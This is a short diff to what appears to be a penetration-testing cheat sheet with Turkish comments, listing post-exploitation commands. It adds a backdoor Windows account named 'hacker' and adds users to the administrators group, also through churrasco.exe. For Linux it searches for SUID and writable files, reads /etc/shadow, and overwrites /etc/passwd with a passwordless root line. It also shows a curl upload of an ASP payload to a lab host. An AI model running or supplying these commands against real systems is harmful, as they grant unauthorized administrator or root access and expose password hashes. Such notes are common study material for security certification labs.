@@ -215,14 +215,16 @@ curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp"
 ```
 
 Windows Commands:
+> net user hacker hacker /add 
 > net localgroup administrators IWAM_BOB /add
 
 Linux Commands:
+> cat /etc/issue
 > uname -a
 > cat /proc/version
 > find / -perm -u=s -type f 2>/dev/null
 > find / -perm -g=s -type f 2>/dev/null
-
+> find / -perm -2 ! -type l -ls 2>/dev/null @Yazma yetkisi olan dosyalar
 ```
 echo root::0:0:root:/root:/bin/bash > /etc/passwd
 su
@@ -245,6 +247,8 @@ shell
 churrasco.exe “net user emr Password1 /add”
 churrasco.exe “net localgroup Administrator emr /add”
 ```
+
+> cat /etc/shadow @Normal kullanıcı göremez
 
 
 ## ANTIVIRUS BYPASS
